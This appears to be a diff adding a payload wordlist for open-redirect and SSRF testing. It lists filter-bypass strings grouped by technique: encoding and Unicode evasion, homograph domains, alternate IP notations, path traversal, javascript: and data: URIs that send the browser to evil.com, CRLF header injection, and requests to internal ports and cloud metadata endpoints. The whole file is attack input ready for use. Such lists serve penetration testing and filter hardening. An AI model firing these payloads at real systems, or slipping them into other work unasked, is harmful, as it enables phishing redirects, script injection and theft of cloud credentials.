@@ -1,0 +1,191 @@
+# Basic Open Redirect Payloads
+http://evil.com
+https://attacker.com
+//malicious.site
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+//evil.com
+\\\\evil.com
+///evil.com
+http://127.0.0.1
+ftp://evil.com
+//google.com@evil.com
+
+# Advanced Protocol Confusion
+htTP://evil.com
+hTTps://evil.com
+Http://evil.com
+HTTPS://evil.com
+//\evil.com
+\\/\\/evil.com
+/\\evil.com
+
+# Unicode & Encoding Evasion
+http://evil%E3%80%82com
+http://evil%E2%80%82com
+http://evil%E2%81%A0com
+http://evil%C2%A0com
+http://evil%E2%80%8Bcom
+http://evil%E2%80%8Ccom
+http://evil%E2%80%8Dcom
+http://evil%E2%80%8Ecom
+http://evil%E2%80%8Fcom
+http://evil%E2%81%9Fcom
+http://evil%C2%ADcom
+http://evil%EF%BB%BFcom
+
+# Domain Confusion & Homograph
+http://еvil.com
+http://еvіl.com
+http://evіl.com
+http://goog1e.com
+http://g00gle.com
+http://googIe.com
+
+# Double Encoding
+http%3A%2F%2Fevil.com
+http%253A%252F%252Fevil.com
+%68%74%74%70%3A%2F%2Fevil.com
+
+# IP Address Variations
+http://192.168.1.1
+http://0x7f000001
+http://2130706433
+http://017700000001
+http://127.1
+http://127.0.1
+http://0177.0.0.1
+http://0x7f.0x0.0x0.0x1
+
+# Path Traversal & Directory Confusion
+/..//evil.com
+/..\evil.com
+/..%2fevil.com
+/..%5cevil.com
+/%2e%2e/evil.com
+/%2e%2e%2fevil.com
+//..%2f..%2fevil.com
+
+# JavaScript & Data URI Advanced
+javascript:location.href='http://evil.com'
+javascript:window.open('http://evil.com')
+javascript:document.location='http://evil.com'
+javascript:top.location='http://evil.com'
+javascript:parent.location='http://evil.com'
+data:text/html,<meta http-equiv="refresh" content="0;url=http://evil.com">
+data:text/html,<script>location='http://evil.com'</script>
+data:text/html,<iframe src="http://evil.com"></iframe>
+
+# Meta Refresh Variations
+data:text/html,<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://evil.com">
+data:text/html,<meta http-equiv=refresh content=0;url=http://evil.com>
+data:text/html,<META HTTP-EQUIV=REFRESH CONTENT=0;URL=http://evil.com>
+
+# Protocol Smuggling
+http:evil.com
+https:evil.com
+//http://evil.com
+//https://evil.com
+///http://evil.com
+////evil.com
+
+# URL Shortener Bypass
+http://bit.ly/evil
+http://tinyurl.com/evil
+http://t.co/evil
+
+# Null Byte & Special Characters
+http://evil.com%00
+http://evil.com%0a
+http://evil.com%0d
+http://evil.com%09
+http://evil.com%20
+http://evil.com%23
+
+# CRLF Injection
+http://evil.com%0d%0a
+http://evil.com%0a%0d
+http://evil.com%0d%0aLocation:%20http://evil.com
+
+# Fragment & Query Confusion
+http://evil.com#
+http://evil.com?
+http://evil.com#fragment
+http://evil.com?param=value
+
+# Mixed Case & Special Protocols
+FTP://evil.com
+FILE://evil.com
+GOPHER://evil.com
+LDAP://evil.com
+DICT://evil.com
+
+# Advanced Bypass Techniques
+http://evil.com@legit.com
+http://legit.com@evil.com
+http://evil.com:80
+http://evil.com:443
+http://evil.com./
+http://evil.com/..
+http://evil.com/%2e%2e
+http://evil.com/%252e%252e
+
+# Internationalized Domain Names (IDN)
+http://хакер.рф
+http://фейк.com
+http://ӎаlicious.com
+
+# Base64 Encoded
+aHR0cDovL2V2aWwuY29t
+aHR0cHM6Ly9ldmlsLmNvbQ==
+
+# Hex Encoded
+%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+
+# Advanced JavaScript Payloads
+javascript:eval(String.fromCharCode(108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,39))
+javascript:setTimeout('location="http://evil.com"',100)
+javascript:setInterval('location="http://evil.com"',1000)
+
+# SVG & XML Payloads
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>location='http://evil.com'</script></svg>
+
+# CSS Injection
+data:text/css,body{background:url('http://evil.com')}
+
+# Advanced Domain Techniques
+http://evil.com.legit.com
+http://legit.com.evil.com
+http://sub.evil.com
+http://evil-legit.com
+http://legitevil.com
+
+# Port Confusion
+http://evil.com:8080
+http://evil.com:3000
+http://evil.com:9000
+
+# Special Characters in Path
+http://evil.com/~
+http://evil.com/`
+http://evil.com/|
+http://evil.com/<
+http://evil.com/>
+http://evil.com/"
+http://evil.com/'
+
+# Advanced Encoding Combinations
+%25%36%38%25%37%34%25%37%34%25%37%30%25%33%41%25%32%46%25%32%46%25%36%35%25%37%36%25%36%39%25%36%43%25%32%45%25%36%33%25%36%46%25%36%44
+
+# SSRF-style Payloads
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:6379
+http://localhost:8080
+http://0.0.0.0:9000
+
+# Cloud Metadata Endpoints
+http://169.254.169.254
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal
+http://metadata.azure.com
